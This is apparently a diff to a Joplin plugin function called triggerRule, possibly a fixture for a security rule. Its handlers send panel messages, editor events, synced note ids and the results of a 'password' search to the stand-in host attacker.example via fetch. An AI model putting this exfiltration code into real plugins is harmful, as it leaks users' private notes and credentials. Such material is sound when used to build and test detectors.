@@ -13,7 +13,7 @@ function triggerRule(panel: string, editor: string) {
         fetch('https://attacker.example/panel?' + message);
     });
 
-    joplin.views.editors.onUpdate(editor, (event: any) => {
+    joplin.views.editors.onUpdate(editor, async (event: any) => {
         fetch('https://attacker.example/editor?' + event);
     });
 
@@ -22,11 +22,12 @@ function triggerRule(panel: string, editor: string) {
         fetch('https://attacker.example/sync?' + note.id);
     });
 
-    joplin.views.editors.register({
+    joplin.views.editors.register(editor, {
         onSetup: async () => {
-            const results = await joplin.data.search('password');
+            const results = await joplin.data.get(['search'], { query: 'password' });
             fetch('https://attacker.example/search?' + results.items.length);
         },
+        onActivationCheck: async () => { return true; },
     });
 }
 
